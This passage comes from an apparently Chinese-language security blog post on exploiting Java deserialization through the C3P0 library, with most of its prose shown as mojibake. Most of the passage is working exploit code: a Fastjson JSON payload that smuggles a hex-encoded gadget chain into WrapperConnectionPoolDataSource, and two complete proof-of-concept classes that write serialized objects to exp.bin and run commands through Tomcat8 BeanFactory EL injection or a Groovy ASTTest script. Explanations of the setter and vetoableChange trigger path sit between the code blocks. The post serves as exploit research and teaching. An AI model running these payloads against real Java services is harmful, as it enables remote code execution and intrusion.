class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC6()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½ç‰ˆæœ¬çš„fastjson</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™é‡Œå…¶å®æ˜¯æœ‰é—®é¢˜çš„æˆ‘ä»¬çš„æµç¨‹ä¸Šæ¥çœ‹ã€‚å°±æ˜¯fastjsonåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šå…ˆè°ƒç”¨æ„é€ æ–¹æ³•åœ¨å»è°ƒç”¨setter getteræ–¹æ³•é‚£æ—¢ç„¶è¿™æ ·çš„è¯æˆ‘ä»¬çš„setå°±æ²¡æœ‰ç”¨äº†é‚£ä¸ºä»€ä¹ˆè¿˜èƒ½ç»§ç»­è§¦å‘æ¼æ´å‘¢</p>
<p>å…³é”®ç‚¹åœ¨å…¶çˆ¶ç±»çš„setæ–¹æ³•é‡Œ<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756365687-2bbad0d3-815a-4f71-9f52-c2824c9b5716.png" alt=""></p>
<p>å½“æˆ‘ä»¬è°ƒç”¨è¯¥setteræ—¶ï¼Œé¦–å…ˆä¼šä¸æ—§çš„<code>userOverridesAsString</code>å±æ€§æ¯”è¾ƒï¼Œè¿™é‡Œæ—§å€¼ä¸º<code>null</code>ï¼Œæ–°å€¼ä¸ºæˆ‘ä»¬æ„é€ çš„<code>userOverridesAsString</code>ï¼Œå› æ­¤è¿™é‡Œä¼šè¿›å…¥ifåˆ¤æ–­ã€‚è·Ÿè¿›<code>vcs.fireVetoableChange</code>å®ä¾‹åŒ–äº†ä¸€ä¸ª<code>PropertyChangeEvent</code>å¯¹è±¡</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756600052-880f1d64-2a8d-4a92-85e8-7fcdeddcfa63.png" alt="">ç„¶åè·Ÿè¿›<code>fireVetoableChange(</code>æ–¹æ³•ï¼Œæœ€ååœ¨375è¡Œè¿™ä¸ªåœ°æ–¹è°ƒç”¨äº†<code>WrapperConnectionPoolDataSource#vetoableChange</code></p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756619381-c06e3e30-a22a-4676-b071-4919b99980dc.png" alt=""></p>
<p>è·Ÿè¿›å»<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756759849-9929f98e-6583-4165-ad31-f19143eb7d3d.png" alt="">å¦‚æœ<code>propName</code>å˜é‡ä¸º<code>userOverridesAsString</code>ï¼Œåˆ™ä¼šç›´æ¥ååºåˆ—åŒ–ä¼ å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²å¹¶å°†è¿”å›çš„å¯¹è±¡èµ‹å€¼ç»™<code>userOverrides</code>å±æ€§ã€‚C3P0é€šè¿‡è¿™ç§æ–¹å¼ï¼Œåœ¨setå®Œ<code>userOverridesAsString</code>å±æ€§åç›´æ¥å¯¹å…¶è¿›è¡Œè§£æï¼Œå‡å°‘äº†ä¸€æ¬¡ç±»åˆå§‹åŒ–æ“ä½œã€‚</p>
<h2 id="c3p0ä¸å‡ºç½‘">c3p0ä¸å‡ºç½‘</h2>
<p>ä¸è®ºæ˜¯URLClassLoaderåŠ è½½è¿œç¨‹ç±»ï¼Œè¿˜æ˜¯JNDIæ³¨å…¥ï¼Œéƒ½éœ€è¦ç›®æ ‡æœºå™¨èƒ½å¤Ÿå‡ºç½‘ã€‚è€ŒåŠ è½½Hexå­—ç¬¦ä¸²çš„æ–¹å¼è™½ç„¶ä¸ç”¨å‡ºç½‘ï¼Œä½†å´æœ‰Fastjsonç­‰çš„ç›¸å…³ä¾èµ–ã€‚é‚£ä¹ˆå¦‚æœç›®æ ‡æœºå™¨ä¸å‡ºç½‘ï¼Œåˆæ²¡æœ‰Fastjsonä¾èµ–çš„è¯ï¼ŒC3P0é“¾åˆè¯¥å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿ</p>
<p>åœ¨JNDIé«˜ç‰ˆæœ¬åˆ©ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŠ è½½æœ¬åœ°çš„Factoryç±»è¿›è¡Œæ”»å‡»ï¼Œè€Œåˆ©ç”¨æ¡ä»¶ä¹‹ä¸€å°±æ˜¯è¯¥å·¥å‚ç±»è‡³å°‘å­˜åœ¨ä¸€ä¸ª<code>getObjectInstance()</code>æ–¹æ³•ã€‚æ¯”å¦‚é€šè¿‡åŠ è½½Tomcat8ä¸­çš„<code>org.apache.naming.factory.BeanFactory</code>è¿›è¡ŒELè¡¨è¾¾å¼æ³¨å…¥</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733757389442-ba078bd2-ade1-4e11-91ec-13424359baf0.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°å’Œjndié«˜ç‰ˆæœ¬ç»•è¿‡å¾ˆåƒå‡è®¾å­˜åœ¨Tomcat8ä¸­çš„<code>org.apache.naming.factory.BeanFactory</code>ã€‚</p>
<p>å°±å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚</p>
<h3 id="poc-4">poc</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Tomcat8</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Tomcat8_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> resourceRef;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Tomcat8_Loader</span> <span class="variable">tomcat8_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat8_Loader</span>();</span><br><span class="line">        Pool_Serial(tomcat8_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç±»ä¼¼çš„è¿˜æœ‰Grovyä¾èµ–</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Grovy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Tomcat8_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;def x\n&quot;</span>;</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,script));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ref;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Tomcat8_Loader</span> <span class="variable">tomcat8_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat8_Loader</span>();</span><br><span class="line">        Pool_Serial(tomcat8_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ–‡ç« å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/link/">Friends</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
